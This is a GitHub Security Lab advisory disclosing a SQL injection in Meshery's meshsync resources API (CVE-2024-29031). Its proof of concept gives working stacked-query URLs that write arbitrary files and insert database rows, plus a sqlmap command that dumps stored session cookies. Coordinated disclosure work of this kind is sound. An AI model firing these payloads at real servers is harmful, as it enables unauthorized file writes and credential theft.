
[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

March 21, 2024
# GHSL-2023-249: SQL injection vulnerability in Meshery - CVE-2024-29031

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Tony Torralba](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2023-12-13: Vulnerability Report Sent
* 2023-12-14: Vulnerability acknowledged by Meshery maintainers
* 2024-02-06: Vulnerability [patched](https://github.com/meshery/meshery/pull/10207).

## Summary

A SQL injection vulnerability in Meshery up to v0.6.181 allows a remote attacker to obtain sensitive information via the `order` parameter of `GetMeshSyncResources`.

## Product

Meshery

## Tested Version

[v0.7.1](https://github.com/meshery/meshery/releases/tag/v0.7.1)

## Details

### SQL injection in `GetMeshSyncResources` (`GHSL-2023-249`)

The Meshery project exposes the function [`GetMeshSyncResources`](https://github.com/meshery/meshery/blob/v0.7.1/server/handlers/meshsync_handler.go#L41) at the API URL `/api/system/meshsync/resources`. The `order` query parameter is directly used to build a SQL query in [line 135 of the `meshync_handler.go` file](https://github.com/meshery/meshery/blob/v0.7.1/server/handlers/meshsync_handler.go#L135), as it can be seen in the following snippet:

```
func (h *Handler) GetMeshSyncResources(rw http.ResponseWriter, r *http.Request, _ *models.Preference, _ *models.User, provider models.Provider) {
	// --snip--
	order := r.URL.Query().Get("order")
	sort := r.URL.Query().Get("sort")
	// --snip--

	result := provider.GetGenericPersister().Model(&model.KubernetesResource{}).
		Preload("KubernetesResourceMeta")

        // --snip--

	if order != "" {
		if sort == "desc" {
			// --snip--
		} else {
			result = result.Order(order)
		}
	}

	err := result.Find(&resources).Error
	// --snip--
}

```
#### Impact

This issue may lead to arbitrary file write by using a SQL injection stacked queries payload, and the `ATTACH DATABASE` command.

Additionally, attackers may be able to access and modify any data stored in the database, like performance profiles (which may contain session cookies), Meshery application data, or any Kubernetes configuration added to the system.

Arbitrary data read and write may be a problem depending on several factors:

* Whether there’s user authentication (if not, unauthenticated users may access the data querying the API normally).
* Whether there’s user authorization (if not, authenticated users may be able to access all data querying the API normally).
* Whether there’s actual sensitive data, like session cookies or credentials, added to Meshery (depends on the configuration).

#### Proof of Concept

To reproduce this issue, the following three requests can be used to write a file at an arbitrary location with arbitrary contents (note that an appropriate cookie needs to be used in the request, for local authentication use `Cookie: meshery-provider=None`):

```
http://(server):9081/api/system/meshsync/resources?order=1%3bATTACH+DATABASE+'/tmp/test'+AS+test--
http://(server):9081/api/system/meshsync/resources?order=1%3bCREATE+TABLE+test.pwn+(dataz+text)--
http://(server):9081/api/system/meshsync/resources?order=1%3bINSERT+INTO+test.pwn+(dataz)+VALUES+("pwned")--

```

Verify that the `test` file was created:

```
cat /tmp/test
pwned

```

Also, arbitrary database entries can be created by issuing a request to the following URL:

```
http://(server):9081/api/system/meshsync/resources?order=1%3bINSERT+INTO+performance_profiles+(metadata)+VALUES+("injected+data")--

```

To extract information from the database, blind SQL injection techniques must be used. For instance, we could use `sqlmap` to automate the process of dumping the request cookies used in a performance profile:

```
$ sqlmap -u 'http://(victim server):9081/api/system/meshsync/resources?order=1*' --technique S --dbms SQLite --header "Cookie: meshery-provider=None" --drop-set-cookie --ignore-code=500 --batch -T performance_profiles -C request_cookies --dump

..snip..

Table: performance_profiles
[1 entry]
+---------------------------+
| request_cookies           |
+---------------------------+
| {"Session": "test_value"} |
+---------------------------+

```
## CVE

* CVE-2024-29031

## Credit

This issue was discovered and reported by GitHub CodeQL team member [@atorralba (Tony Torralba)](https://github.com/atorralba). The vulnerability was found with the help of [CodeQL’s SQL injection query](https://codeql.github.com/codeql-query-help/go/go-sql-injection/).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-249` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information

